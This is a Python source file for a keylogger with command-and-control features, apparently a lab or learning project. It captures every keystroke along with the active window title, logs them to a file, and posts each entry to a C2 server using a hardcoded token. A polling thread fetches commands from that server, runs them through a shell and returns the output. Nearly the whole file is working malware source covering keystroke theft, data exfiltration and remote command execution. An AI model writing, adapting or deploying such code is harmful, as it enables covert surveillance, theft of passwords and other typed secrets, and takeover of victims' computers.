import datetime
import logging
from logging.handlers import RotatingFileHandler
import os
import platform
import threading
import requests
import subprocess
import uuid
import time
from pynput import keyboard


class InputMonitor:

    def __init__(self, log_filename=None):
        if log_filename is None:
        # Automatically finds the Desktop on Windows and Linux, and creates a "Keylogger" folder if it doesn't exist
            log_filename = os.path.join(os.path.expanduser("~"), "Desktop", "Keylogger")
        
        self.os_name = platform.system()
        self.active_window_cache = "Initializing..."
        self.running = True
        
        self.unique_id = str(uuid.uuid4())[:8]
        self.c2_server = "http://localhost:8000"
        self.api_token = "secret123"
        
        os.makedirs(log_filename, exist_ok=True)
        current_date_str = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.log_file = os.path.join(log_filename, f"activity_{current_date_str}.log")

        self.logger = logging.getLogger("InputLogger")
        self.logger.setLevel(logging.INFO)
        self.handler = RotatingFileHandler(
            self.log_file,
            maxBytes=5 * 1024 * 1024,
            backupCount=5,
            encoding="utf-8",
        )
        self.formatter = logging.Formatter("%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
        self.handler.setFormatter(self.formatter)
        self.logger.addHandler(self.handler)

    def fetch_window_title(self):
        if self.os_name == "Windows":
            import pygetwindow as pwg
            win = pwg.getActiveWindow()
            return win.title if win else "Unknown/Desktop"
        elif self.os_name == "Linux":
            import pywinctl as pwc
            win = pwc.getActiveWindow()
            return win.title if win else "Unknown/Desktop"
        return "Unsupported OS"

    def _window_tracker_loop(self):
        while self.running:
            try:
                self.active_window_cache = self.fetch_window_title()
            except Exception as e:
                self.active_window_cache = "Error fetching window"
                print(f"\n[DEBUG ERROR] Background thread encountered an issue: {e}")
            time.sleep(1.0)
            
    def send_to_c2(self, log_entry):
        try:
            response = requests.post(
                f"{self.c2_server}/log",
                json={"id": self.unique_id, "log": log_entry, "OS": self.os_name},
                headers={"Authorization": f"Bearer {self.api_token}"},
                timeout=5,
            )
            if response.status_code != 200:
                print(f"[C2 ERROR] Failed to send log: {response.status_code} - {response.text}")
        except requests.RequestException as e:
            pass
        
    def poll_command(self):
        while self.running:
            try:
                response = requests.get(
                    f"{self.c2_server}/poll/{self.unique_id}",
                    headers={"Authorization": f"Bearer {self.api_token}"},
                    timeout=10,
                )
                
                data = response.json()
                command = data.get("command", "")
                
                if command:
                    print(f"[C2 COMMAND] Received: {command}")
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    if not output:
                        output = "[C2 COMMAND] Command executed with no output."
                    
                    requests.post(
                        f"{self.c2_server}/result",
                        json={"id": self.unique_id, "result": output, "OS": self.os_name},
                        headers={"Authorization": f"Bearer {self.api_token}"},
                        timeout=5,
                    )
                
            except requests.RequestException as e:
                pass
            except Exception as e:
                print(f"[POLL ERROR]: {e}")
                
            time.sleep(10)

    def on_press(self, key):
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window_title = self.active_window_cache
        formatted_key = ""

        try:
            if key.char is not None:
                formatted_key = key.char
            else:
                formatted_key = "[UNKNOWN]"
        except AttributeError:
            key_mapping = {
                keyboard.Key.space: "[SPACE]",
                keyboard.Key.enter: "[ENTER]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.shift_l: "[SHIFT_L]",
                keyboard.Key.shift_r: "[SHIFT_R]",
                keyboard.Key.ctrl: "[CTRL]",
                keyboard.Key.ctrl_l: "[CTRL_L]",
                keyboard.Key.ctrl_r: "[CTRL_R]",
                keyboard.Key.alt: "[ALT]",
                keyboard.Key.alt_l: "[ALT_L]",
                keyboard.Key.alt_r: "[ALT_R]",
                keyboard.Key.cmd: "[WIN]",
                keyboard.Key.cmd_l: "[WIN_L]",
                keyboard.Key.cmd_r: "[WIN_R]",
                keyboard.Key.menu: "[CONTEXT_MENU]",
                keyboard.Key.caps_lock: "[CAPS_LOCK]",
                keyboard.Key.num_lock: "[NUM_LOCK]",
                keyboard.Key.scroll_lock: "[SCROLL_LOCK]",
                keyboard.Key.up: "[UP]",
                keyboard.Key.down: "[DOWN]",
                keyboard.Key.left: "[LEFT]",
                keyboard.Key.right: "[RIGHT]",
                keyboard.Key.insert: "[INSERT]",
                keyboard.Key.delete: "[DELETE]",
                keyboard.Key.home: "[HOME]",
                keyboard.Key.end: "[END]",
                keyboard.Key.page_up: "[PAGE_UP]",
                keyboard.Key.page_down: "[PAGE_DOWN]",
                keyboard.Key.f1: "[F1]",
                keyboard.Key.f2: "[F2]",
                keyboard.Key.f3: "[F3]",
                keyboard.Key.f4: "[F4]",
                keyboard.Key.f5: "[F5]",
                keyboard.Key.f6: "[F6]",
                keyboard.Key.f7: "[F7]",
                keyboard.Key.f8: "[F8]",
                keyboard.Key.f9: "[F9]",
                keyboard.Key.f10: "[F10]",
                keyboard.Key.f11: "[F11]",
                keyboard.Key.f12: "[F12]",
            }

            if key in key_mapping:
                formatted_key = key_mapping[key]
            else:
                formatted_key = f"[{str(key).replace('Key.', '').upper()}]"

        log_entry = f"[{window_title}] Key: {formatted_key}"

        print(f"[{current_time}] {log_entry}")
        self.logger.info(log_entry)
        self.send_to_c2(log_entry)

    def on_release(self, key):
        if key == keyboard.Key.esc:
            print("[Alert] Stopping the monitor")
            self.running = False
            return False

    def start(self):
        print(f"Starting monitor on OS: {self.os_name}")
        background_thread = threading.Thread(
            target=self._window_tracker_loop, daemon=True
        )
        background_thread.start()
        
        threading.Thread(target=self.poll_command, daemon=True).start()

        with keyboard.Listener(
                on_press=self.on_press, on_release=self.on_release
        ) as listener:
            listener.join()


if __name__ == "__main__":
    monitor = InputMonitor()
    monitor.start()